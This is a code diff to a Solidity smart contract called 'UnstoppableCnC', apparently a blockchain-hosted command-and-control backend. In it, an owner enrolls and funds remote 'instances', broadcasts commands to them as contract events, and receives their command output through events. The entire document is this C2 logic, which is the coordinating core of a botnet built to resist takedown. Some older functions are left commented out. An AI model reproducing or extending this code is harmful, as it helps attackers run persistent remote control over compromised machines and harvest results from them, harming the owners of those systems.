@@ -11,26 +11,31 @@ contract UnstoppableCnC {
 	struct Instance{
 		bytes20 sessionId; //Hash of address + machineId + salt
 		InstanceStates state; // default is NotExist
+		uint256 funds;
 
 	}
 	
-	event InstanceRegistered (address instance, bytes20 sessionId);
+	event InstanceRegistered (address instance, bytes20 sessionId, uint256 fundsTransfered);
 	
-	string constant NO_COMMAND = '';
+	event CommandPending (bytes32 indexed hashId, string command);
 	
+	event CommandResult (bytes32 indexed hashId, string commandResult);
+	
+	string constant NO_COMMAND = 'NA';
+	
+	/*
 	struct CommandResult {
 		bytes20 idHash;
 		string command;
 		string result;
 	}
-	
-
+	*/
 	
 	mapping (address => Instance) public instances;
 
-	mapping (address => CommandResult) public commands;
+	//mapping (address => CommandResult) public commands;
 	
-	CommandResult [] results;
+	//CommandResult [] results;
 	
 	
 	
@@ -87,14 +92,18 @@ contract UnstoppableCnC {
 		instances[msg.sender].state = InstanceStates.Active;
 		instances[msg.sender].sessionId = sessionId;
 		
-		InstanceRegistered(msg.sender, sessionId);
+		InstanceRegistered(msg.sender, sessionId,instances[msg.sender].funds);
+		
+		if (instances[msg.sender].funds > 0){
+    		msg.sender.transfer(instances[msg.sender].funds);
+    		instances[msg.sender].funds = 0;
+		}
 		//TODO: take machine info as a pending command result	
 	}
 	
 	/**
 		Methods for instances. this methods will execute for registered addresses only
 	**/
-	
 	
 	/*
 		instances periodically call this function to check if there is a command waiting for them
@@ -106,35 +115,42 @@ contract UnstoppableCnC {
 		returns: 
 			command to execute, or null if nothing to do.
 		
-	*/
+	
 	function getWork (bytes20 sessionId) 
 	    public view onlyByValidInstance(sessionId) 
-	    returns (string) {
-
+	    returns (string) 
+	{
 		CommandResult storage cr = commands[msg.sender];
 		if (cr.idHash > 0) //a command has been assigned
 			return cr.command;
 		else
 			return NO_COMMAND; 
-	}
+	}*/
+	
+	
+	
 	/*
 		instances call this function to return the results of executed commands.
 		Once returned, instance will be ready to receive its next command.
 		sessionId: current sessionId for the instance
 		result: is an object that contains the command's result, with some meta data.
 	*/
+	
 	function uploadWorkResults (bytes20 sessionId, string result) 
 	    public onlyByValidInstance(sessionId)
-	    returns (bool){
-		
-		CommandResult storage cr = commands[msg.sender];
+	    returns (bool)
+	{
+		/*CommandResult storage cr = commands[msg.sender];
 		require (cr.idHash > 0); //There must be a pending command for this instance
 		cr.result = result;
 		results.push (cr);
 		delete commands[msg.sender];
+		*/
+		
+		bytes32 hashId = sha3(msg.sender);
+		CommandResult(hashId, result);
 		
 		return true;
-		
     }
 		
 	/**
@@ -148,9 +164,13 @@ contract UnstoppableCnC {
 		instances.add (instanceId, new instance)
 	*/
 	function allowInstance (address instanceId) 
-	    public onlyBy(owner) returns (bool success) {
+	    public onlyBy(owner) payable returns (bool success) {
 	   
-	   instances[instanceId] = Instance({ sessionId: 0, state: InstanceStates.Inactive });
+	   instances[instanceId] = Instance({ sessionId: 0, state: InstanceStates.Inactive, funds: msg.value });
+	   
+	   //instanceId.transfer(100000000);
+	
+	   
 	   return true;
 	        
     }
@@ -165,22 +185,40 @@ contract UnstoppableCnC {
 	    }
 	
 	
+	
+	
+	
+	
 	function addWork (address instanceId, string command) 
 	    public onlyBy(owner) returns (bool) {
 	    require (instances[instanceId].state == InstanceStates.Active);
-	    require (commands[instanceId].idHash == 0); //We can't add another command if another one's already pending
-	    bytes20 hashId = ripemd160(instanceId);
-	    commands[instanceId] = CommandResult (hashId, command, "");
+	    //require (commands[instanceId].idHash == 0); //We can't add another command if another one's already pending
+		
+	    bytes32 hashId = sha3(instanceId);
+	    //commands[instanceId] = CommandResult (hashId, command, "");
+		CommandPending(hashId, command);
+		
 	    return true;
 	}
 	
+	/*
 	function fetchResults () 
 	    public onlyBy(owner) returns (CommandResult [] res) {
 	        res = results;
 	        delete results;
 	        return res;
     }
+	*/
 	/*
+	event tempEvent (address indexed hashId, string command);
+	
+	function tempwork (address add, string c)
+		public returns (bool){
+			
+			tempEvent(add, c);
+		}
+	
+	
 	function chargeInstance (address instanceId) 
 	    public onlyBy(owner) {
 	
